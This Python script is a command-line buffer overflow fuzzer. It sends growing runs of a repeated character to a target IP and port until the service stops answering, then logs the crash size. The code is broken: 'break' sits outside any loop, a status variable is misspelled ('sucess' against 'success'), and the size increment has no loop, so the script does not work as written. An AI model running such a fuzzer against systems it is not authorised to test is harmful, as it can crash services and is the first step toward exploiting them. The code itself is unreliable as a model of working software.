import socket, time, argparse, sys
from colorama import Fore, init, Style
init()
info = f'{Fore.YELLOW + Style.BRIGHT}[!]{Fore.RESET + Style.RESET_ALL}'
sucess = f'{Fore.GREEN + Style.BRIGHT}[+]{Fore.RESET + Style.RESET_ALL}'
error = f'{Fore.RED + Style.BRIGHT}[-]{Fore.RESET + Style.RESET_ALL}'

def create_payload(size, prefix):
    return prefix * size

def fuzz(ip, port, timeout, size, sleep, prefix, step):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            payload = create_payload(size, prefix)
            print(f"{info} Sending payload of size: {size}")
            s.sendall(bytes(payload + '\r\n', 'latin-1'))
            s.recv(1024)
    except socket.timeout:
        print(f"{success} Crashed at payload size: {size}")
        with open('CrashPoint.txt', 'w') as f:
            f.write(f'Crashed at size: {size}')
        break
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"{error} Unexpected error: {e}")
        break
    size += step
    time.sleep(sleep)


def main():
    parser = argparse.ArgumentParser(description='Buffer Overflow fuzzer.')
    parser.add_argument('ip', type=str, help='Target IP address')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('-n' ,'--initial_size', type=int, default=100, help='Initial payload size')
    parser.add_argument('-x' ,'--step', type=int, default=100, help='Payload size increment step')
    parser.add_argument('-t' ,'--timeout', type=int, default=5, help='Timeout')
    parser.add_argument('-s' ,'--sleep', type=int, default=1, help='Sleep time')
    parser.add_argument('-p' ,'--prefix', type=str, default='A', help='Prefix')
    args = parser.parse_args()

    IP = args.ip
    PORT = args.port
    TIMEOUT = args.timeout
    SIZE = args.initial_size
    SLEEP = args.sleep
    PREFIX = args.prefix
    STEP = args.step
    fuzz(IP, PORT, TIMEOUT, SIZE, SLEEP, PREFIX, STEP)
if __name__ == '__main__':
    main()
